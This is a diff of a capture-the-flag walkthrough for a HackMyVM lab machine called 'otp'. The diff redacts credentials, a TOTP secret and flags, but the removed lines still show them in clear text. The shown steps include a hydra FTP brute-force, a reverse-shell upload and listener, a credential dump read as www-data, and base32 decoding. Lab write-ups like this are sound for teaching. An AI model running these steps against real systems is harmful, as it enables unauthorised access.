@@ -90,8 +90,8 @@ After this, I logged in to the website to see a username that I won’t write it
 
 ## login to page login.php
 
-otpuser
-#4ck!ng!s!nMybl0od
+o*******
+#4c************
 
 user:david
 
@@ -101,7 +101,8 @@ After finding the username, I bruteforced the FTP server.
 
 ```bash
 ┌──(root💀K4liR4t)-[~/Documents/HACK_MY_VM/Hard/otp]
-└─# hydra -l david -P /usr/share/wordlists/rockyou.txt ftp://192.168.1.34Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+└─# hydra -l ****** -P /usr/share/wordlists/rockyou.txt ftp://192.168.1.34
+Hydra v9.2 (c) 2021 by van Hauser/THC & ****** Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
 Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-12-22 17:18:01
 [DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
@@ -110,7 +111,7 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-12-22 17:18:
 [STATUS] 255.67 tries/min, 767 tries in 00:03h, 14343632 to do in 935:03h, 16 active
 [STATUS] 264.57 tries/min, 1852 tries in 00:07h, 14342547 to do in 903:31h, 16 active
 [STATUS] 262.93 tries/min, 3944 tries in 00:15h, 14340455 to do in 909:01h, 16 active
-[21][ftp] host: 192.168.1.34   login: david   password: DAVID
+[21][ftp] host: 192.168.1.34   login: ******   password: ******
 1 of 1 target successfully completed, 1 valid password found
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-12-22 17:39:56
 ```
@@ -124,7 +125,7 @@ This gives us the password for the user we found.
 └─# ftp 192.168.1.34
 Connected to 192.168.1.34.
 220 (vsFTPd 3.0.3)
-Name (192.168.1.34:root): david
+Name (192.168.1.34:root): ******
 331 Please specify the password.
 Password: 
 230 Login successful.
@@ -252,7 +253,7 @@ ftp> ls
 -rw-------    1 1001     1001          247 Dec 22 17:55 rev.php
 226 Directory send OK.
 ```
-In this reverse shell, I have entered my IP address and port information. Thus, I will listen on port 9001 (which is the same on the reverse shell file).
+In this reverse shell, I have entered my IP address and port information. Thus, I will listen on port 1337 (which is the same on the reverse shell file).
 
 ```bash
 ┌──(root💀K4liR4t)-[~/Documents/HACK_MY_VM/Hard/otp]
@@ -270,46 +271,9 @@ www-data@otp:/var/www/otp/argon/u9l04d_$
 
 ```bash
 www-data@otp:/opt$ cat creds.sql 
--- MariaDB dump 10.19  Distrib 10.5.12-MariaDB, for debian-linux-gnu (x86_64)
---
--- Host: localhost    Database: otp
--- ------------------------------------------------------
--- Server version       10.5.12-MariaDB-0+deb11u1
-
-/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
-/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
-/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
-/*!40101 SET NAMES utf8mb4 */;
-/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;
-/*!40103 SET TIME_ZONE='+00:00' */;
-/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
-/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
-/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
-/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;
-
---
--- Table structure for table `creds`
---
-
-DROP TABLE IF EXISTS `creds`;
-/*!40101 SET @saved_cs_client     = @@character_set_client */;
-/*!40101 SET character_set_client = utf8 */;
-CREATE TABLE `creds` (
-  `id` int(11) NOT NULL AUTO_INCREMENT,
-  `username` varchar(255) NOT NULL,
-  `password` varchar(255) NOT NULL,
-  `totp` varchar(255) NOT NULL,
-  PRIMARY KEY (`id`)
-) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=utf8mb4;
-/*!40101 SET character_set_client = @saved_cs_client */;
-
---
--- Dumping data for table `creds`
---
-
 LOCK TABLES `creds` WRITE;
 /*!40000 ALTER TABLE `creds` DISABLE KEYS */;
-INSERT INTO `creds` VALUES (1,'','','NYZXMM3SI4YG43RUI4QXMM3ZGBKXKUAK');
+INSERT INTO `creds` VALUES (1,'','','NYZXMM3SI4YG43RUI4Q***********');
 /*!40000 ALTER TABLE `creds` ENABLE KEYS */;
 UNLOCK TABLES;
 /*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;
@@ -327,8 +291,8 @@ www-data@otp:/opt$
 ```
 ```bash
 ┌──(root💀K4liR4t)-[~/Documents/HACK_MY_VM/Hard/otp]
-└─# echo "NYZXMM3SI4YG43RUI4QXMM3ZGBKXKUAK" |base32 -d
-n3v3rG0nn4G!v3y0UuP
+└─# echo "NYZXMM3SI4YG43RUI4Q**********" |base32 -d
+n3v****************
 ```
 # 07 totp.otp.hmv
 Then, I opened totp.otp.hmv to find a login page that I could bypass using the following input.
@@ -343,7 +307,7 @@ We get a portion of the password for the user. Then, we have an instruction to d
 # the -i flag replaces the same file
 sed -i 's/\\n/\n/g' payloads
 ```
-avijneyam:n3v3rG0nn4G!v3y0UuP___Cuz_HackMyVM_iS_theRe_Only_4_y0u_:)
+avijneyam:*******************___Cuz_*****************_Only_4*****:)
 
 # 08 Switch to the user avijneyam
 
@@ -361,7 +325,7 @@ User avijneyam may run the following commands on otp:
     ```
 ```bash
 avijneyam@otp:~$ cat flag_user.txt 
-2990aa5108d5803f3fdca99c277ba352
+2990aa5108d**********************
 ```
 Here, the user can run a command that looks like a webserver.
 
@@ -569,5 +533,5 @@ uid=0(root) gid=0(root) groups=0(root)
 
 
 flag_r00t.txt
-8a2d55707a9084982649dadc04b426a0
+8a2d55707a908******************
 ```
